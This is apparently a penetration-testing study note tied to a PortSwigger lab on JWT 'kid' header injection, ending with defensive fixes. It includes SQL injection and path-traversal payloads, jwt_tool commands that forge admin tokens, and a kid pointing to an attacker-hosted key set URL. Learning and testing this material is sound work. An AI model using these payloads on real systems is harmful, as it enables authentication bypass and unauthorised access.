---
tags: [vapt, jwt, intermediate]
difficulty: intermediate
module: "18 - JWT"
topic: "18.09 JWT Header Injection — kid claim (SQLi, path traversal)"
portswigger_labs: ["JWT authentication bypass via kid header path traversal"]
---

# 18.09 — JWT Header Injection: kid Claim

## What Is the kid Header?

```
KID (Key ID):
  Tells the server WHICH key to use for JWT verification
  
  If server has multiple keys: kid identifies which one to fetch
  
  JWT HEADER:
  {
    "alg": "HS256",
    "typ": "JWT",
    "kid": "key-1"
  }
  
  SERVER LOGIC:
  key = key_store.get(kid)  // fetch key from store
  verify(token, key)
  
THE ATTACK:
  kid is used in database queries, file lookups, etc.
  If kid is injectable → SQL injection, path traversal, etc.!
```

---

## Attack 1: SQL Injection via kid

```
VULNERABLE SERVER CODE:
  key = db.query(f"SELECT key_value FROM keys WHERE kid = '{kid}'")
  # ↑ SQL injection if kid is not sanitized!
  
ATTACK:
  Set kid to: ' UNION SELECT 'attacker_known_secret'--
  
  Resulting query:
  SELECT key_value FROM keys WHERE kid = '' UNION SELECT 'attacker_known_secret'--'
  → Returns: 'attacker_known_secret'!
  
  Now the server uses 'attacker_known_secret' as the HMAC key!
  Attacker signs JWT with 'attacker_known_secret' → MATCH → accepted!

FULL EXPLOIT:
  STEP 1: Choose a simple secret, e.g., "hacked"
  
  STEP 2: Craft kid with SQLi that returns your secret:
    kid: "' UNION SELECT 'hacked'--"
    
  STEP 3: Sign JWT payload with "hacked" as HS256 secret
  
  STEP 4: Create JWT with the malicious kid header
    + modified payload (role=admin)
    + signature with "hacked"
    
  STEP 5: Server evaluates:
    key = db.query("SELECT key_value FROM keys WHERE kid = '' UNION SELECT 'hacked'--")
    → Returns "hacked"
    verify(token, "hacked")
    → Token signed with "hacked" → MATCHES → accepted!
```

---

## Attack 2: Path Traversal via kid

```
VULNERABLE SERVER CODE:
  key_file = f"/keys/{kid}.pem"
  key = open(key_file).read()
  verify(token, key)

ATTACK: Path traversal to a predictable file:
  kid: "../../dev/null"
  → key_file = "/keys/../../dev/null.pem" = "/dev/null.pem"
  
  But: /dev/null.pem doesn't exist...
  
  Better: Use /dev/null (empty file → empty string as key):
  kid: "../../../dev/null"
  → Key = "" (empty string!)
  → Sign JWT with "" as HMAC secret
  → Server uses empty key → MATCH!

EVEN BETTER: Exploit a file with known content:
  Some files have predictable content:
  /proc/sys/kernel/randomize_va_space → "2\n" on most Linux
  /etc/hostname → known in some cases
  
  OR: If /dev/null loads as empty key:
  
  python3 -c "
  import jwt
  payload = {'role': 'admin', 'userId': 1}
  token = jwt.encode(payload, '', algorithm='HS256')
  print(token)
  "
  
  jwt_tool:
  python3 jwt_tool.py TOKEN -I -hc kid -hv '../../../dev/null' -S hs256 -p ''
  # -I = inject custom header
  # -hc = header claim to inject
  # -hv = header value
  # -p '' = sign with empty string
```

---

## Attack 3: kid Pointing to Attacker's JWKS

```
SOME IMPLEMENTATIONS FETCH KEY BASED ON KID:
  If kid looks like a URL → fetch JWKS from that URL
  → Back to jku-style attack but via kid!
  
  kid: "https://attacker.com/evil-jwks.json"
  → Server fetches JWKS from attacker's server
  → Gets attacker's public key
  → Attacker signed with private key → accepted!
```

---

## Testing kid Injection

```bash
# TEST SQL INJECTION IN KID:
# Change kid to SQL injection payloads:

python3 jwt_tool.py TOKEN -I -hc kid -hv "' UNION SELECT '1337'--" \
  -S hs256 -p "1337"
# → If server uses "1337" as the key → our token with sig('1337') matches!

# TEST PATH TRAVERSAL:
python3 jwt_tool.py TOKEN -I -hc kid -hv "../../../dev/null" \
  -S hs256 -p ""
# → If server reads empty key → our token with sig('') matches!

# TEST VARIOUS NULL-LIKE FILE PATHS:
for path in "../../../dev/null" "/dev/null" "../../proc/self/fd/0" "/etc/hostname"; do
    echo "Testing path: $path"
    python3 jwt_tool.py TOKEN -I -hc kid -hv "$path" -S hs256 -p "" 2>/dev/null
done

# DETECT SQLi IN KID:
# Set kid to: ' (single quote) → see if server returns SQL error
# kid: "key' OR '1'='1" → does this cause errors?
```

---

## Fix

```
DEFENSES:
  ✓ Validate and sanitize kid header:
    kid should be a simple alphanumeric identifier, nothing else
    
    # Python - validate kid:
    import re
    if not re.match(r'^[a-zA-Z0-9_-]{1,64}$', kid):
        raise ValueError("Invalid kid format")
    
  ✓ Never use kid directly in SQL queries → use parameterized queries:
    key = db.query("SELECT key_value FROM keys WHERE kid = ?", [kid])
    
  ✓ Never use kid as a file path → use allowlist of known key IDs:
    ALLOWED_KEYS = {"key-1": load_pem("key1.pem"), "key-2": load_pem("key2.pem")}
    key = ALLOWED_KEYS.get(kid)
    if not key: reject!
    
  ✓ Don't allow kid to be a URL (fetch from remote)
```

---

## Related Notes
- [[07 - JWT Header Injection jwk claim]] — embedded key attack
- [[08 - JWT Header Injection jku claim]] — remote JWKS URL attack
- [[Module 06 - SQL Injection]] — SQL injection fundamentals
- [[Module 14 - XXE]] — path traversal concepts overlap
- [[18 - Defense Strong Algorithms Validation Short Expiry]] — fix
